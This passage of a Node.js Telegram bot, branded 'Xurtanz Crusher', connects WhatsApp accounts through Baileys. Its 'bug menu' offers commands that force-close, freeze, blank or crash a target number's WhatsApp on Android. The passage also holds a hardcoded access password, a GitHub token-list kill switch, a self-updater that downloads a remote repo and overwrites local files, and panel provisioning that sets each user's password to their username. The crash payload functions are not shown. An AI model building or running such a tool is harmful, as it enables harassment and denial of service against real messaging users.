
// Ini Batas Untuk Bypass process.exit nya

//Jika tidak mau eror jangan di ubah

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const dotenv = require("dotenv");
const FormData = require("form-data");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "./assets/cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const config = require("./settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const {
LOC,
EGG,
OWNER_ID,
PLTA,
DOMAIN
} =require('./settings/config.js');
// ===================== SETTINGS =====================
const DISABLE_PROTECTION = process.env.DISABLE_Xover_PROTECTION === "1";
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/teksbandingbanding-cell/Xover/refs/heads/main/tokens.json";
// ===================== RANDOM IMAGE =====================
// ~ Thumbnail Vid
const vidthumbnail = "https://files.catbox.moe/5rumra.jpg";

// ================== CONFIG ==================
const correctPassword = "Xurtanz"; // ganti sesuai kebutuhan

//update
const GH_OWNER = "teksbandingbanding-cell";
const GH_REPO = "Xover";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

    const { data } = await axios.get(url, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, {
                responseType: "arraybuffer"
            });

            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));

            console.log("[UPDATE]", local);
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

// ===== FLAG GLOBAL UNTUK PASSWORD =====
let isUnlocked = false; // default: belum isi password

// ================== PROGRESS BAR (MENURUN: 100 -> 0)
function showProgressBarDescending(duration = 1000) {
  return new Promise(resolve => {
    const total = 20; // panjang bar
    let current = total; // mulai penuh
    const emojis = ["🍁", "🍬", "🦄", "🍭", "🕷️"];
    const colors = [chalk.red, chalk.yellow, chalk.green, chalk.cyan, chalk.blue, chalk.magenta];

    const interval = Math.max(20, Math.floor(duration / (total * 2))); // interval aman
    const timer = setInterval(() => {
      current = Math.max(0, current - 1);

      const filled = "█".repeat(Math.round(current));
      const empty = " ".repeat(total - Math.round(current));
      const percent = Math.floor((current / total) * 100); // menurun 100 -> 0
      const colorFn = colors[current % colors.length];
      const emoji = emojis[current % emojis.length];

      process.stdout.write(
        `\r${chalk.white("Script akan dinyalakan:")} [${colorFn(filled)}${empty}] ${emoji} ${percent}%`
      );
      if (current <= 0) {
        clearInterval(timer);
        process.stdout.write("\n");
        resolve();
      }
    }, interval);
  });
}

// ================== VALIDASI TOKEN ==================
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL, { timeout: 8000 });
    return response.data.tokens || [];
  } catch (err) {
    console.error(chalk.red("❌ Gagal Di Variabel Raw Github."), err.message || "");
    return [];
  }
}

async function validateToken() {
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.error(chalk.red("❌ Token Terdeteksi Penyusup keluar...!!"));
    process.exit(1);
  }
}

// ================== START BANNER ==================
function printBannerAndStart() {
  console.clear();
  console.log(chalk.green(`
⣿⣿⣿⣿⡿⣩⣾⣿⣿⣶⣍⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⠟⣼⡿⢟⢸⣿⣿⣿⠿⢷⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡏⣾⣿⡆⣾⣿⣸⣯⣿⡾⣿⢗⠿⣷⣝⣛⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣮⣭⣾⣿⡏⢿⣝⣯⣽⣶⣿⣿⣿⠿⣿⡇⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢫⣾⣿⢿⠟⣋⢿⣲⣿⡿⣟⣿⣦⣝⡻⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣮⢫⣾⣿⠀⠛⠁⣿⣿⣾⣿⣿⣿⣿⣯⣷⣪⣟⢿⣿
⣿⢿⢿⣿⣿⣿⢸⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⠻⣿⣿⣝⡜⣿
⢃⡖⣼⣿⣿⣿⣏⣿⣿⣿⣿⣿⣧⡯⣽⣛⢿⠿⠿⢿⠿⠟⡛⣣⣿
⣷⣾⣾⣿⣿⡏⣝⢨⣟⡿⣿⣿⣿⣿⣮⣿⣫⡿⠿⣭⡚⣷⣴⣿⣿
⣿⠻⢿⢰⡬⣱⣝⣮⣿⣿⣿⣾⣭⣟⣻⡿⠿⠿⠿⣛⣵⣿⣿⣿⣿
⣛⠎⢟⡴⣿⣿⣷⣿⣾⣿⣿⣿⣿⣿⣿⣿⣬⣭⣭⣝⡻⢿⣿⣿⣿
⡜⣫⣿⣷⣿⣿⣼⣿⣿⣟⡿⣿⣿⣿⣿⣿⡟⠿⣿⡿⣿⣦⢻⣿⣿
⢅⣭⣿⣿⣿⣿⣼⣿⣿⣿⣽⣿⣿⣿⣿⡿⣹⣷⣝⣃⣭⣵⣿⣿⣿
`));
  console.log(chalk.yellow(`
━━━━━━━━━━━━━━━━━━
[ 🛡️ ] BYPASS ACTIVE
[ 🍭 ] SECURITY KEY VALID
━━━━━━━━━━━━━━━━━━
Created By @XurooStore
━━━━━━━━━━━━━━━━━━
`));
  console.log(chalk.blue("Xurtanz Is Here...."));
  console.log(chalk.magenta("🔐 Semua Terkunci."));
}
//===================CREATE PANEL BY NELLOEZ WIGUNA /////////////////////////
function convertRam(inp) {
    if (inp === "unli") return { ram: 0, cpu: 0, disk: 0 };

    let gb = inp.replace("gb", "");
    if (isNaN(gb)) return null;

    let ram = parseInt(gb) * 1000;

    const table = {
        1000: [1000, 40, 1000],
        2000: [2000, 60, 1000],
        3000: [3000, 80, 2000],
        4000: [4000, 100, 2000],
        5000: [5000, 120, 3000],
        6000: [6000, 140, 3000],
        7000: [7000, 160, 4000],
        8000: [8000, 180, 4000],
        9000: [9000, 200, 5000],
        10000: [10000, 220, 5000],
    };

    const res = table[ram];
    if (!res) return null;

    return { ram: res[0], cpu: res[1], disk: res[2] };
}
const dataFile = path.join(__dirname, "./database/data.json");
if (!fs.existsSync(dataFile)) fs.writeFileSync(dataFile, JSON.stringify({ subdomain: {}, nodes: {} }, null, 2));

function getSellerList() {
  try {
    return JSON.parse(fs.readFileSync('./database/seller.json', 'utf-8'));
  } catch {
    return { sellers: [] };
  }
}

function saveData(type, key, value) {
  const data = JSON.parse(fs.readFileSync(dataFile));
  data[type][key] = value;
  fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
}
function saveSellerList(data) {
  fs.writeFileSync('./database/seller.json', JSON.stringify(data, null, 2));
}

async function createPanel(bot, chatId, username, u, memo, cpu, disk, ramLabel) {
  const data = getSellerList();
  if (String(chatId) !== String(OWNER_ID) && !data.sellers.includes(chatId))
    return bot.sendMessage(chatId, `<blockquote>❌ Kamu tidak memiliki izin.</blockquote>`, {
    parse_mode: "HTML"
  });

  const name = `${username}Server`;
  const spc = 'if [ -f /home/container/package.json ]; then npm install; fi; npm start';
  const email = `${username}@Xurtanz..id`;
  const password = username;

  try {

    const userRes = await fetch(`${DOMAIN}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${PLTA}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const userData = await userRes.json();
    if (userData.errors) return bot.sendMessage(chatId, `⚠️ ${userData.errors[0].detail}`);

    const user = userData.attributes;

    const serverRes = await fetch(`${DOMAIN}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${PLTA}`
      },
      body: JSON.stringify({
        name,
        description: '𝚂𝙴𝚁𝚅𝙴𝚁 𝙿𝚁𝙸𝚅𝙰𝚃𝙴',
        user: user.id,
        egg: parseInt(EGG),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(LOC)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const serverData = await serverRes.json();
    if (serverData.errors) return bot.sendMessage(chatId, `⚠️ ${serverData.errors[0].detail}`);

    bot.sendMessage(chatId, `<blockquote>✅ Panel ${ramLabel} untuk ${username} berhasil dibuat.</blockquote>`, {
    parse_mode: "HTML"
    });

    if (vidthumbnail) {
      bot.sendPhoto(u, vidthumbnail, {
        caption: `<blockquote>📦 DETAIL AKUN PANEL 📦
👤 Username: ${user.username}
🔑 Password: ${password}
📧 Email: ${email}
🌐 Login: ${DOMAIN}

💻 Spesifikasi:
RAM: ${ramLabel}
Disk: ${disk === '0' ? 'Unlimited' : disk + 'MB'}
CPU: ${cpu === '0' ? 'Unlimited' : cpu + '%'}

⚠️ Catatan:
• Simpan data login
• Jangan sebar ke orang lain
• Gunakan dengan bijak</blockquote>`,
parse_mode: "HTML"
      });
    }
  } catch (err) {
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
}

// ================== RUN PASSWORD (INTERACTIVE) ==================
if (process.stdin.isTTY) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

  rl.question(chalk.red.bold("🛡️ Masukkan Security Key:\n> "), async (input) => {
    if (input === correctPassword) {
      rl.close();
      try {
        await showProgressBarDescending(1400);
      } catch (e) {}

      try {
        process.stdout.write(chalk.cyan("🔎 Memvalidasi token... "));
        await validateToken();
        console.log(chalk.green("Xurtanz OK!!"));
        // <<< SET UNLOCK TRUE >>>
        isUnlocked = true;
      } catch (e) {
        console.error(chalk.red("\n❌ Validasi token gagal!"));
        process.exit(1);
      }

      printBannerAndStart();
    } else {
      rl.close();
      console.log(chalk.red.bold("❌ Security Key Salah! Akses Ditolak."));
      process.exit(1);
    }
  });
} else {
  // Non-interactive environment (mis. Pterodactyl) -> gunakan env RUN_KEY untuk auto-start
  const providedKey = process.env.RUN_KEY;
  const expectedKey = process.env.SECURITY_KEY || correctPassword;

  (async () => {
    if (!providedKey) {
      console.error(chalk.red("❌ Tidak ada RUN_KEY dan tidak ada TTY. Set RUN_KEY untuk auto-start."));
      process.exit(1);
    }
    if (providedKey !== expectedKey) {
      console.error(chalk.red("❌ RUN_KEY tidak cocok. Keluar."));
      process.exit(1);
    }

    await showProgressBarDescending(1400);
    try {
      process.stdout.write(chalk.cyan("🔎 Memvalidasi token... "));
      await validateToken();
      console.log(chalk.green("Xurtanz OK!!"));
      // <<< SET UNLOCK TRUE >>>
      isUnlocked = true;
    } catch {
      console.error(chalk.red("\n❌ Validasi token gagal!"));
      process.exit(1);
    }
    printBannerAndStart();
  })();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));

const USER_IDS_FILE = 'database/userids.json';

function readUserIds() {
    try {
        const data = fs.readFileSync(USER_IDS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Gagal membaca daftar ID pengguna:', error);
        return [];
    }
}


function saveUserIds(userIds) {
    try {
        fs.writeFileSync(USER_IDS_FILE, JSON.stringify(Array.from(userIds)), 'utf8');
    } catch (error) {
        console.error('Gagal menyimpan daftar ID pengguna:', error);
    }
}

const userIds = new Set(readUserIds());

function addUser(userId) {
    if (!userIds.has(userId)) {
        userIds.add(userId);
        saveUserIds(userIds);
        console.log(`Pengguna ${userId} ditambahkan.`);
    }
}

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>Xurtanz  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Process
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>Xurtanz  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Not Connected
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await ConnectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>Xurtanz  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>Xurtanz  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  let customcode = "QWERTYUI"
  const code = await sock.requestPairingCode(botNumber, customcode);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>Xurtanz  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Code Pairing : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>Xurtanz  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
─ Status : Error ❌ ${error.message}
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// ~ Fungsional Function Before Parameters
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Get Speed Bots
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Premium ! - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}
 
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
const CHANNEL_USERNAME = "@"; // WAJIB channel publik

// ================== PROGRESS BAR ==================
const bars = [
  { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 120 },
  { bar: "▰▰▱▱▱▱▱▱▱ 25%", delay: 150 },
  { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 120 },
  { bar: "▰▰▰▰▱▱▱▱▱ 55%", delay: 150 },
  { bar: "▰▰▰▰▰▱▱▱▱ 70%", delay: 120 },
  { bar: "▰▰▰▰▰▰▱▱▱ 85%", delay: 150 },
  { bar: "▰▰▰▰▰▰▰▰▱ 95%", delay: 120 },
  { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅", delay: 150 }
];

async function runProgressBar(chatId) {
  try {
    const sent = await bot.sendMessage(
      chatId,
      "⏳ Preparing menu...\n\n▱▱▱▱▱▱▱▱▱ 0%"
    );

    const msgId = sent.message_id;

    for (const step of bars) {
      await new Promise(res => setTimeout(res, step.delay));
      await bot.editMessageText(
        `⏳ Preparing menu...\n\n${step.bar}`,
        { chat_id: chatId, message_id: msgId }
      );
    }

    return msgId;
  } catch (e) {
    return null; // kalau gagal, lanjut saja
  }
}

// ================== CEK JOIN CHANNEL (SAFE) ==================
async function isUserJoinedChannel(userId) {
  try {
    const member = await bot.getChatMember(CHANNEL_USERNAME, userId);
    const status = member?.status;
    return ["member", "administrator", "creator"].includes(status);
  } catch (err) {
    console.log("[JOIN CHECK ERROR]", err.message);
    return true; 
    // ⚠️ fallback true supaya bot tidak mati /start
  }
}

// ================== /START HANDLER ==================
bot.onText(/\/start/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isUnlocked) {
      return bot.sendMessage(chatId, "⚠️ Anda Belum Memasukan Password!");
    }

    const joined = await isUserJoinedChannel(senderId);

    if (!joined) {
      return bot.sendMessage(
        chatId,
`ᴡᴏɪ ʜᴀᴍᴀ ᴊᴏɪɴ ɢᴄ ᴅɪ ʙᴀᴡᴀʜ ᴋᴀʟᴏ ᴍᴀᴜ ʟᴀɴᴊᴜᴛ ᴋᴇ ᴍᴇɴᴜ ᴜᴛᴀᴍᴀ
›› ${CHANNEL_USERNAME}`,
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ",
                  url: `https://t.me/${CHANNEL_USERNAME.replace("@", "")}`
                }
              ]
            ]
          }
        }
      );
    }

    // progress bar
    const loadingMsgId = await runProgressBar(chatId);
    if (loadingMsgId) {
      await bot.deleteMessage(chatId, loadingMsgId).catch(() => {});
    }

// menu utama
    const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();

const menuText = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐂𝐑𝐈𝐏𝐓
⚔ King : @XurooStore
📁 Version : 2 Lite
🀄️ Status Prem : ${premiumStatus}
🫀 Id : ${senderId}
☠️ Runtime : ${runtime}
❤️‍🔥 Username : ${username}

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
   await bot.sendMessage(chatId, menuText, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "⬅️ Back", callback_data: "back_to_main" },
            { text: "King", url: "https://t.me/XurooStore" },
            { text: "➡️ Next", callback_data: "accesmenu" }
          ]
        ]
      }
    });

    // ================== SEND AUDIO (SAFE) ==================
    const audioPath = path.join(__dirname, "./assets/Xurtanz.mp3");

    try {
      await bot.sendAudio(chatId, audioPath, {
        caption: `Xurtanz  ☇ XurooStore`,
        performer: `Youcan`,
      });
    } catch (err) {
      console.log("[SEND AUDIO ERROR]", err.message);
      await bot.sendMessage(chatId, "Thank Udah Make Script Ini");
    }

  } catch (err) {
    console.log("[/START ERROR]", err.message);
    bot.sendMessage(msg.chat.id, "❌ Terjadi error, coba /start lagi.");
  }
});


bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    
   

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashfc") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

𝐁𝐔𝐆 𝐌𝐄𝐍𝐔
⊘ /XoForce 628xxx - forclose
⊘ /XoForce2 628xxx - forclose spam
⊘ /XoDelay 628xxx - delay Hard
⊘ /XoDelay2 628xxx - delay bebas spam
⊘ /XoDelay3 628xxx - delay bebas spam hard
⊘ /XoDelay4 628xxx - delay Extream
⊘ /XoDelay5 628xxx - Delay khusus nokos
⊘ /XoBlank 628xxx - Blank Andro 
⊘ /XoCrash 628xxx - Crash Andro
⊘ /XoForce3 628xxx - Forclose 1 Msg
⊘ /XoForce4 628xxx - Forclose Click 
Click button di bawah ini untuk melanjutkan menu
</pre>
`;
      replyMarkup = { inline_keyboard: [
      [
            { text: "⬅️ Back", callback_data: "create" },
            { text: "King", url: "https://t.me/obitp" },
            { text: "➡️ Next", callback_data: "thanksto" }
      ]
    ] 
  };
    }
    
    if (query.data === "accesmenu") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔
ⵢ. /setcd ( Duration )
ⵢ. /addadmin ( ID )
ⵢ. /addprem ( ID ) 
ⵢ. /deladmin ( ID )
ⵢ. /delprem ( ID )
ⵢ. /connect ( Number )

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
      replyMarkup = { inline_keyboard: [
      [
            { text: "⬅️ Back", callback_data: "back_to_main" },
            { text: "King", url: "https://t.me/XurooStore" },
            { text: "➡️ Next", callback_data: "tools1" }
      ]
    ] 
  };
    }

    if (query.data === "tools1") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore
𝐓𝐎𝐎𝐋𝐒 𝟏
⌑ /unmute - ʀᴇᴘʟᴀʏ
⌑ /mute - ʀᴇᴘʟᴀʏ
⌑ /update - no reply

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
      replyMarkup = { inline_keyboard: [
      [
            { text: "⬅️ Back", callback_data: "accesmenu" },
            { text: "King", url: "https://t.me/XurooStore" },
            { text: "➡️ Next", callback_data: "tmptmd" }
      ]
    ] 
  };
    }
    
    if (query.data === "tmptmd") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

Silahkan Pilih Menu Md Di Bawah ini

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
      replyMarkup = { inline_keyboard: [
      [
       { text: "Md 1", callback_data: "mdmenu1" },
       { text: "Md 2", callback_data: "mdmenu2" }
      ],
      [
       { text: "Md 3", callback_data: "mdmenu3" },
       { text: "Md 4", callback_data: "mdmenu4" }
      ],
      [
       { text: "King", url: "https://t.me/XurooStore" },
       { text: "Channel", url: "https://t.me/" }
      ],
      [
       { text: "⬅️ Back", callback_data: "tools1" },
       { text: "➡️ Next", callback_data: "create" }
      ]
    ] 
  };
    }
    
     if (query.data === "mdmenu1") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

𝐌𝐃 𝐌𝐄𝐍𝐔 𝟏
⌑ /faktaunik - faktos
⌑ /xnxx - ʙᴀʜᴀɴ ɴɢᴏᴄᴏᴋ
⌑ /muslimai - ᴘᴇʀᴛᴀɴʏᴀᴀɴ ᴍᴜsʟɪᴍ
⌑ /cekkhodam - ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ ʟᴜ ʏᴀɴɢ 1
⌑ /paptt - ʙᴀʜᴀɴ ɴɢᴏᴄᴏᴋ
